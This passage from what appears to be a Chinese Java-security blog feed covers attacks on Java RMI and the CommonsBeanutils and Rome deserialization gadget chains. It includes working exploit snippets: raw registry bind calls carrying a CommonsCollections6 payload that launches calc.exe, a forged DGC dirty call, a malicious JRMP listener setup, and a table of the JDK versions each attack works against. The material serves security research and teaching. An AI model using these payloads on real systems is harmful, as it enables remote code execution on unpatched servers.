<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：在RMI中Registry，Server，Client都可以互相进行远程类加载，也就是说两两之间都可以通过codebase加载远程类(如果在本地classpath找不到)触发静态代码块执行。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>在RMI的通信过程中，实际上<strong>对象是绑定在本地JVM中的</strong>，通过网络传输的是函数参数、函数返回值，如果函数过程中出现异常也需要对异常消息进行传输，所以整个过程中可能出现问题的三个部分是：</p><ol><li>函数参数的序列化&#x2F;反序列化</li><li>函数返回值的序列化&#x2F;反序列化</li><li>函数异常处理的序列化&#x2F;反序列化</li></ol><blockquote><p><strong>注意：</strong></p><ul><li>在JEP290出现之前(jdk版本低于<code>6u141</code>, <code>7u131</code>,<code>8u121</code>)，思路1、2、3都是可行的，往后的版本就会被拦截。</li><li>在jdk版本小于<code>8u231</code>之前，思路4中的DGC  Call是可行的，但往后的版本也存在bypass方式。</li><li>思路4中的JRMP Listener不受版本限制。</li></ul></blockquote><h4 id="1-参数反序列化-attack-Server"><a href="#1-参数反序列化-attack-Server" class="headerlink" title="1.参数反序列化(attack Server)"></a>1.参数反序列化(attack Server)</h4><p>如果S端对象方法的参数列表中存在类型为Object的参数，那么根据RMI的协议分析，参数会经历序列化与反序列化进行网络传输，此时我们直接将参数设置为恶意的Object就可以触发S端的反序列化漏洞(如果S端存在反序列化链)。</p><p>修改Server端类的方法参数为Object：</p><img src="/2023/06/02/RMI%20Attack/image-20230611192506114.png" class="" title="image-20230611192506114"><p>获取远程类，调用远程方法并传递参数为恶意反序列化对象，成功执行命令。</p><img src="/2023/06/02/RMI%20Attack/image-20230611193357258.png" class="" title="image-20230611193357258"><h4 id="2-参数反序列化-attack-Registry"><a href="#2-参数反序列化-attack-Registry" class="headerlink" title="2.参数反序列化(attack Registry)"></a>2.参数反序列化(attack Registry)</h4><p>上一种方式实用性不够强，我们将其特殊化，即开启RMIserver的主机是否存在方法参数为Object的已知类？注意到Registry本身就是远程对象，因此Registry类的各种方法也是可以获取的，以bind方法为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(String name, Remote obj)</span><br>    <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException, AccessException;<br></code></pre></td></tr></table></figure><p>参数存在Object，符合要求，远程调用bind函数时逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123; <span class="hljs-comment">//Hash</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">//opNum</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        var11 = var2.getInputStream();<br>        <span class="hljs-comment">//var7是bound name</span><br>        var7 = (String)var11.readObject();<br>        <span class="hljs-comment">//var8是remote object</span><br>        var8 = (Remote)var11.readObject();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        var2.releaseInputStream();<br>    &#125;<br><br>    var6.bind(var7, var8);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var2.getResultStream(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>    &#125;<br></code></pre></td></tr></table></figure><p>明显对于name以及obj都是直接readObject的，我们构造数据包需要的字段opNum、methodHash等都在代码里可以找到，因此直接发送原始RMI流量至Registry调用其bind方法，并传递恶意对象即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Serializable</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsCollections6</span>().getObject(<span class="hljs-string">&quot;win_cmd:calc.exe&quot;</span>);<br><span class="hljs-type">ObjID</span> <span class="hljs-variable">objID</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-number">0</span>);<br>sendRawCall(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>,objID,<span class="hljs-number">0</span>,<span class="hljs-number">4905912898345647071L</span>,object);<br></code></pre></td></tr></table></figure><img src="/2023/06/02/RMI%20Attack/image-20230612103630855.png" class="" title="image-20230612103630855"><p>或者可以利用代理类封装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> CC6.getPayloadObject(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br><br>Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;whatever&quot;</span>, payload);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span>  <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, map);<br><span class="hljs-type">Remote</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>registry.bind(<span class="hljs-string">&quot;evil&quot;</span>, obj);<br></code></pre></td></tr></table></figure><h4 id="3-返回值反序列化"><a href="#3-返回值反序列化" class="headerlink" title="3.返回值反序列化"></a>3.返回值反序列化</h4><p>很好理解，如果S端起一个恶意RMI，C端远程调用S端方法后，S端传递返回值给C端，此时如果返回值中包含恶意对象C端就可能受到反序列化攻击。</p><p>首先S端起恶意RMI，编写方法返回恶意Object。</p><img src="/2023/06/02/RMI%20Attack/image-20230612110654709.png" class="" title="image-20230612110654709"><p>然后C端调用S端hello，即可触发反序列化。</p><img src="/2023/06/02/RMI%20Attack/image-20230612110750686.png" class="" title="image-20230612110750686"><h5 id="伪造Lesae"><a href="#伪造Lesae" class="headerlink" title="伪造Lesae"></a>伪造Lesae</h5><p>进行对远程的操作之前，总会先检查Lease是否存在或过期。如果没有就会先发一个DGC Call去获取一个Lease，如果我们伪造这个Lease并替换成恶意反序列化对象，同样可以触发反序列化。S端除了会传入我们使用的远程对象还会传入一个DGCImpl_Skel对象，它的dispatch方法中存在clean()与dirty()对应case 0与case 1，并且都存在反序列化。</p><img src="/2023/06/02/RMI%20Attack/image-20230612143136681.png" class="" title="image-20230612143136681"><img src="/2023/06/02/RMI%20Attack/image-20230612143242895.png" class="" title="image-20230612143242895"><p>因此我们伪造一个Dirty Call即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//attack Registry</span><br><span class="hljs-type">String</span> <span class="hljs-variable">registryHost</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">registryPort</span> <span class="hljs-operator">=</span> <span class="hljs-number">21099</span>;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">payloadObject</span> <span class="hljs-operator">=</span> CC6.getPayloadObject(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">objID</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-number">2</span>);<br>        RemoteUtils.sendRawCall(registryHost, registryPort,  objID, <span class="hljs-number">0</span>, -<span class="hljs-number">669196253586618813L</span>,payloadObject);<br></code></pre></td></tr></table></figure><p>或者可以攻击S端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RMIRegistryEndpoint</span> <span class="hljs-variable">rmiRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIRegistryEndpoint</span>(<span class="hljs-string">&quot;192.168.111.1&quot;</span>,<span class="hljs-number">1099</span>);<br><span class="hljs-type">RemoteObjectWrapper</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectWrapper</span>(rmiRegistry.lookup(<span class="hljs-string">&quot;math&quot;</span>),<span class="hljs-string">&quot;math&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">payloadObject</span> <span class="hljs-operator">=</span> CC6.getPayloadObject(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br><br><span class="hljs-type">ObjID</span> <span class="hljs-variable">objID</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-number">2</span>);<br>RemoteUtils.sendRawCall(remoteObj.getHost(), remoteObj.getPort(),  objID, <span class="hljs-number">0</span>, -<span class="hljs-number">669196253586618813L</span>,payloadObject);<br></code></pre></td></tr></table></figure><h4 id="4-异常消息反序列化"><a href="#4-异常消息反序列化" class="headerlink" title="4.异常消息反序列化"></a>4.异常消息反序列化</h4><h5 id="JRMP-Listener"><a href="#JRMP-Listener" class="headerlink" title="JRMP Listener"></a>JRMP Listener</h5><p>流量分析中可以看到，每次调用远程对象都会伴随发送一个JRMP Call请求，处理逻辑在UnicastRef调用excuteCall()，正常情况下也就是return Type为1，返回为空，异常状态下return Type 为2，就会触发反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//部分代码</span><br><span class="hljs-keyword">switch</span>(var1) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        Object var14;<br>        <span class="hljs-keyword">try</span> &#123;<br>            var14 = <span class="hljs-built_in">this</span>.in.readObject();<br></code></pre></td></tr></table></figure><p>因此我们编写一个构造出一个基于JRMP协议的Server，当Client发起JRMP Call时依照JRMP协议格式返回一个报错信息，并将恶意的object包含在内(数据包的object字段)。参考<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java">ysoserial#JRMPListener</a>。</p><p>此方法在高版本下依然有效，原因是JEP290仅仅在JRMP协议层之上进行了过滤，忽略了对JRMP层错误信息的过滤。</p><h5 id="DGC-Call"><a href="#DGC-Call" class="headerlink" title="DGC Call"></a>DGC Call</h5><p>类似的过程在Registry与Server之间也存在，Server访问Registry去bind远程对象的时候的时候，Registry会返回DGC请求，因为DGC请求也建立在JRMP之上，因此也可以编写恶意的JRMP Listener攻击Registry。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">registryHost</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">registryPort</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JRMPHost</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">JRMPPort</span> <span class="hljs-operator">=</span> <span class="hljs-number">16999</span>;<br><br>Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="hljs-literal">null</span>);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//因为UnicastRemoteObject的默认构造方式是protect的，所以需要反射调用</span><br><br><span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> (UnicastRemoteObject) constructor.newInstance(<span class="hljs-literal">null</span>);<br><span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">ep</span> <span class="hljs-operator">=</span> (TCPEndpoint) getFieldValve(getFieldValve(getFieldValve(remoteObject,<span class="hljs-string">&quot;ref&quot;</span>),<span class="hljs-string">&quot;ref&quot;</span>),<span class="hljs-string">&quot;ep&quot;</span>);<br><br><span class="hljs-comment">//这里直接反射修改对应的值，间接修改构造的序列化数据</span><br>setFieldValue(ep,<span class="hljs-string">&quot;port&quot;</span>,JRMPPort);<br>setFieldValue(ep,<span class="hljs-string">&quot;host&quot;</span>,JRMPHost);<br><br><br><span class="hljs-type">ObjID</span> <span class="hljs-variable">objID_</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//Bind(&quot;test&quot;,payloadObj)</span><br>RemoteUtils.sendRawCall(registryHost,registryPort,objID_,<span class="hljs-number">0</span>,<span class="hljs-number">4905912898345647071L</span>,<span class="hljs-string">&quot;test&quot;</span>,remoteObject);<br></code></pre></td></tr></table></figure><p>这种方式截止到8u231就被禁止了，当然也存在bypass方式能够触发8u241之前的版本。</p><h2 id="RMI-attack总结"><a href="#RMI-attack总结" class="headerlink" title="RMI attack总结"></a>RMI attack总结</h2><p>来自参考资料：</p><table><thead><tr><th>攻击类型</th><th align="left">jdk版本要求</th><th>其它条件</th></tr></thead><tbody><tr><td>加载远程类</td><td align="left">&lt;7u21、6u45</td><td>无</td></tr><tr><td>加载远程类</td><td align="left">任意</td><td>SecurityManager allow&#x2F; java.rmi.server.useCodebaseOnly&#x3D;false</td></tr><tr><td>远程对象方法参数反序列化</td><td align="left">&lt;8u242</td><td>远程对象参数除int、boolean等基本类外&#x2F;服务端存在反序列化链</td></tr><tr><td>远程对象方法参数反序列化</td><td align="left">任意</td><td>远程对象参数除int、boolean等基本类和String类外&#x2F;远程对象环境存在反序列化链</td></tr><tr><td>Registry方法参数反序列化</td><td align="left">&lt;8u121，7u13，6u141</td><td>Registry端存在反序列化链</td></tr><tr><td>远程对象方法结果</td><td align="left">任意</td><td>调用端存在反序列化环境</td></tr><tr><td>DGC方法返回值存在反序列化</td><td align="left">&lt;8u121，7u13，6u141</td><td>调用端存在反序列化链</td></tr><tr><td>JRMI CALL 报错反序列化</td><td align="left">任意</td><td>调用端存在反序列化链</td></tr><tr><td>Registry bind&#x2F;rebind 触发JRMI CALL报错</td><td align="left">&lt;8u231</td><td>Registry存在反序列化链</td></tr><tr><td>Registry 方法参数反序列化触发JRMI CALL报错</td><td align="left">&lt;8u241</td><td>Registry存在反序列化链</td></tr></tbody></table><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><ul><li><p><strong>RMI:</strong></p><ul><li><a href="https://tttang.com/archive/1430/">JAVA 协议安全笔记-RMI篇 - 跳跳糖 (tttang.com)</a></li></ul></li><li><p><strong>LDAP:</strong></p><ul><li><a href="https://tttang.com/archive/1441/">JAVA 协议安全笔记-JNDI篇 - 跳跳糖 (tttang.com)</a></li></ul></li><li><p><strong>CORBA:</strong></p><ul><li><p><a href="https://paper.seebug.org/1445/">https://paper.seebug.org/1445/</a></p></li><li><p><a href="https://paper.seebug.org/1446/">https://paper.seebug.org/1446/</a></p></li></ul></li><li><p><strong>Summary:</strong></p><ul><li><a href="https://dem0dem0.top/2022/06/01/%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E5%86%8D%E8%B0%88JNDI/">https://dem0dem0.top/2022/06/01/%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E5%86%8D%E8%B0%88JNDI/</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化漏洞二</title>
    <link href="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/"/>
    <url>/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsBeanutils利用链"><a href="#CommonsBeanutils利用链" class="headerlink" title="CommonsBeanutils利用链"></a>CommonsBeanutils利用链</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PriorityQueue-x3D-gt-getter"><a href="#PriorityQueue-x3D-gt-getter" class="headerlink" title="PriorityQueue &#x3D;&gt; getter"></a>PriorityQueue &#x3D;&gt; getter</h3><p>CB链使用PriorityQueue作为入口，在CC链中我们知道<code>PriorityQueue.readObject()</code>会触发<code>xxxComparator.compare()</code>，比如CC2中的<code>TransformingComparator.compare()</code>。在CB链中触发的是<code>BeanComparator.compare()</code>。</p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230605155113845.png" class="" title="image-20230605155113845"><p>可以看到<code>BeanComparator.compare()</code>会触发任意property的getter方法，而property就是BeanComparator的构造属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(&lt;property&gt;)).readObject() ==&gt; queueArray[i].get&lt;property&gt;()<br></code></pre></td></tr></table></figure><h3 id="getter-x3D-gt"><a href="#getter-x3D-gt" class="headerlink" title="getter &#x3D;&gt; ?"></a>getter &#x3D;&gt; ?</h3><p>既然能够触发到任意getter方法，能够利用的getter有哪些呢？这里给出</p><ul><li><p><strong>TemplatesImpl.getoutputProperties()</strong></p><ul><li><code>TemplatesImpl.getoutputProperties()</code>不必多说，在CC链中我们也提到它可以触发<code>newTransformer</code>。</li></ul></li><li><p><strong>JdbcRowSetImpl.getdatabaseMetaData()</strong></p><ul><li><p><code>JdbcRowSetImpl.getdatabaseMetaData()</code>则不同，它会调用到<code>connect()</code>方法最终得到一个JNDI注入点<code>InitialContext.lookup()</code>。</p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230605162639424.png" class="" title="image-20230605162639424"></li></ul></li></ul><p>​其中DataSourceName可以使用<code>JdbcRowSetImpl.setDataSourceName(jndiURL)</code>来设置。</p><h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><ul><li>DEP：commons-beanutils:1.9.2&amp;&amp;commons-collections:3.1</li><li>IN：PriorityQueue.readObject()</li><li>OUT：queueArray[i].getoutputProperties()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">o</span>, <span class="hljs-params">property</span>)</span> ==&gt; two obj invoke getter: o1&amp;&amp;o2<br>o.getoutput<span class="hljs-constructor">Properties()</span><br>&lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CB2-noCC"><a href="#CB2-noCC" class="headerlink" title="CB2(noCC)"></a>CB2(noCC)</h2><h3 id="剥离CC依赖"><a href="#剥离CC依赖" class="headerlink" title="剥离CC依赖"></a>剥离CC依赖</h3><p>CBnoCC与CB1的区别就在于剥除了对于commons-collections的依赖，起因是CB1中的BeanComparator如果使用<code>BeanComparator(String property)</code>这个重载就会使用<code>ComparableComparator</code>这个类，而这个类是在CC里的：</p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230605200730849.png" class="" title="image-20230605200730849"><p>因此换成下面那个重载即可，寻找jdk中Comparator的子类，发现<code>String.CASE_INSENSITIVE_ORDER</code>也就是<code>CaseInsensitiveComparator</code>这个java.lang.String中的静态内部类是符合要求的，基于此重构BeanComparator即可，其余不变。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br></code></pre></td></tr></table></figure><ul><li>DEP：commons-beanutils:1.9.2</li><li>IN：PriorityQueue.readObject()</li><li>OUT：queueArray[i].getoutputProperties()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">o</span>, <span class="hljs-params">property</span>)</span> ==&gt; two obj invoke getter: o1&amp;&amp;o2<br>o.getoutput<span class="hljs-constructor">Properties()</span><br>&lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CB3"><a href="#CB3" class="headerlink" title="CB3"></a>CB3</h2><p><strong>前面已经提到了如何剥离CC依赖，由于这不会对利用过程有任何影响，因此这条链也可以去除CC的依赖。</strong></p><ul><li>DEP：commons-beanutils:1.9.2</li><li>IN：PriorityQueue.readObject()</li><li>OUT：queueArray[i].getdatabaseMetaData()</li><li>SINK：InitialContext.lookup()</li></ul><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">o</span>, <span class="hljs-params">property</span>)</span> ==&gt;two obj invoke getter: o1.gettr<span class="hljs-literal">()</span>&amp;&amp;o2.getter<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JdbcRowSetImpl</span>.</span></span>getdatabase<span class="hljs-constructor">MetaData()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JdbcRowSetImpl</span>.</span></span>connect<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InitialContext</span>.</span></span>lookup<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure></blockquote><h1 id="Rome利用链"><a href="#Rome利用链" class="headerlink" title="Rome利用链"></a>Rome利用链</h1><p>有关Rome链的一些<a href="https://boogipop.com/2023/04/26/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/">补充</a></p><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="x3D-gt-getter"><a href="#x3D-gt-getter" class="headerlink" title="? &#x3D;&gt; getter"></a>? &#x3D;&gt; getter</h3><p>调用到Rome中的<code>BeanIntrospector.getPropertyDescriptors(this._beanClass)</code>即可任意getter，其中有两个类存在此调用：</p><ul><li><p><strong>ToStringBean.toString(String prefix)</strong></p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606110030814.png" class="" title="image-20230606110030814"></li><li><p><strong>EqualsBean.beanEquals()</strong></p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606110100668.png" class="" title="image-20230606110100668"></li></ul><h3 id="x3D-gt-obj-toString"><a href="#x3D-gt-obj-toString" class="headerlink" title="? &#x3D;&gt; obj.toString()"></a>? &#x3D;&gt; obj.toString()</h3><ul><li><p><strong>BadAttributeValueExpException.readObject()</strong></p><p>CC链里已经讲过，BadAttributeValueExpException可以触发任意类的toString()。</p></li><li><p><strong>EqualsBean.beanHashCode()</strong></p><img src="/2023/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/image-20230606112116432.png" class="" 